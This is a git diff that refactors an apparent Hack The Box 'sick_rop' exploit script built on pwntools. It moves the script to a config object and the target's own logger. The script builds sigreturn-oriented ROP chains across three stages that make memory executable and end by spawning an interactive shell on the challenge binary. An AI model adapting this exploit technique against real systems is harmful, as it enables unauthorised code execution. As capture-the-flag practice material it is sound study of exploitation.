@@ -1,6 +1,8 @@
+import pathlib
+
+from core.target_config import Config, Mode
 from core.targetbase import TargetBase
 from pwn import p64, u64
-from loguru import logger
 from pwn import SigreturnFrame
 from pwnlib.tubes.process import process
 from abstract.pwntarget import PwnTarget
@@ -17,17 +19,25 @@ class SickROPPwn(PwnTarget):
 
 
 if __name__ == '__main__':
-    t = TargetBase(pwn_target=SickROPPwn)
+    config = Config(
+        rop=True,
+        mode=Mode.local,
+        file=pathlib.Path('/home/lim8en1/htb/projects-archive/sick_rop/sick_rop'),
+        detect_libc=True,
+        main_function_name='vuln',
+        offset=0x20
+    )
+    t = TargetBase(pwn_target=SickROPPwn, config=config)
 
-    read_ptr = t.sample.symbols["read"]
-    write_ptr = t.sample.symbols["write"]
-    start_ptr = t.sample.symbols["_start"]
-    vuln_ptr = t.sample.symbols["vuln"]
+    read_ptr = t.file.symbols["read"]
+    write_ptr = t.file.symbols["write"]
+    start_ptr = t.file.symbols["_start"]
+    vuln_ptr = t.file.symbols["vuln"]
 
-    symtab_section = t.sample.get_section_by_name('.symtab')
+    symtab_section = t.file.get_section_by_name('.symtab')
     symtab_data = symtab_section.data()
-    symtab_address = t.sample.address + symtab_section.header.sh_offset
-    logger.info(f'Symtab location {hex(symtab_address)}')
+    symtab_address = t.file.address + symtab_section.header.sh_offset
+    t.logger.info(f'Symtab location {hex(symtab_address)}')
 
     new_stack = None
 
@@ -35,14 +45,14 @@ if __name__ == '__main__':
         symbol_address = u64(symtab_data[address+0x8:address+0x10])
         if start_ptr == symbol_address:
             new_stack = symtab_address + address + 0x8
-            logger.info(f"Found pointer to _start @ {hex(new_stack)}")
+            t.logger.info(f"Found pointer to _start @ {hex(new_stack)}")
             break
         if vuln_ptr == symbol_address:
             new_stack = symtab_address + address + 0x8
-            logger.info(f"Found pointer to vuln @ {hex(new_stack)}")
+            t.logger.info(f"Found pointer to vuln @ {hex(new_stack)}")
             break
     if not new_stack:
-        logger.critical("Failed to find new stack ptr")
+        t.logger.critical("Failed to find new stack ptr")
         exit(0)
 
     access_flags = 7
@@ -61,7 +71,7 @@ if __name__ == '__main__':
     stage1_frame.rdx = access_flags
     stage1_frame.rip = syscall_ret_gadget
     stage1_frame.rsp = new_stack
-    logger.info(f"Sending stage 1")
+    t.logger.info(f"Sending stage 1")
     rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage1_frame)[0x10:]
     data = t.run_main(t.create_payload(rop))
     t.process.recv(desired_syscall)
@@ -73,7 +83,7 @@ if __name__ == '__main__':
     stage2_frame.rdx = 0x100
     stage2_frame.rip = syscall_ret_gadget
     stage2_frame.rsp = writable_data+0x80
-    logger.info(f"Sending stage 2")
+    t.logger.info(f"Sending stage 2")
 
     rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage2_frame)[0x10:]
     data = t.run_main(t.create_payload(rop))
@@ -88,10 +98,10 @@ if __name__ == '__main__':
     stage3_frame.rdx = 0
     stage3_frame.rip = syscall_ret_gadget
     stage3_frame.rsp = writable_data+0x80
-    logger.info(f"Sending stage 3")
+    t.logger.info(f"Sending stage 3")
     rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage3_frame)[0x10:]
     t.run_main(t.create_payload(rop))
     t.process.recv(desired_syscall)
-    logger.success(f"Spawning shell")
+    t.logger.success(f"Spawning shell")
     t.process.interactive()
 
